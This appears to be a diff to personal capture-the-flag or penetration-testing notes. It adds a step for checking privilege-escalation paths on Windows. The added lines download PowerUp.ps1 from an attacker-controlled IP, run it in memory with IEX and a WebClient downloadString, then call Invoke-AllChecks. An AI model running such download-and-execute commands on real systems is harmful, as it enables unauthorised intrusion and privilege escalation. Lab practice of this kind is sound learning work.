@@ -21,8 +21,12 @@ println cmd.execute().text
 Apache check connections:
 /var/log/apache2# 
 
-Power UP tools:
+Download Power UP tools:
 https://github.com/PowerShellMafia/PowerSploit
+
+Check user access right:
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/PowerUp.ps1')
+Invoke-AllChecks
 
 indirect show content
 (get-content user.txt).substring(0,16)
